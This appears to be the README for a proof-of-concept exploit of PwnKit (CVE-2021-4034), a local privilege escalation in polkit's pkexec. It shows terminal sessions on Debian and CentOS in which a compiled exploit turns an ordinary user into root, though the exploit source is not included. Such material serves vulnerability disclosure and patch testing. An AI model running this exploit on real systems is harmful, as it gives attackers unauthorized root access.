# CVE-2021-4034
PoC for PwnKit: Local Privilege Escalation Vulnerability in polkit’s pkexec (CVE-2021-4034) 
Contact Ashish Kumar Laxkar Mail ID: ashish.laxkar16@gmail.com

https://seclists.org/oss-sec/2022/q1/80  

# PoC

Verified on Debian 10 and CentOS 7.

```
ashish@debian:~$ grep PRETTY /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
ashish@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
user@debian:~$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
user@debian:~$ ./cve-2021-4034-poc
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(user)
```

```
[ashish@centos ~]$ grep PRETTY /etc/os-release
PRETTY_NAME="CentOS Linux 7 (Core)"
[ashish@centos ~]$ id
uid=11000(user) gid=11000(user) groups=11000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[ashish@centos ~]$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
[ashish@centos ~]$ ./cve-2021-4034-poc
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root),11000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2# exit
```
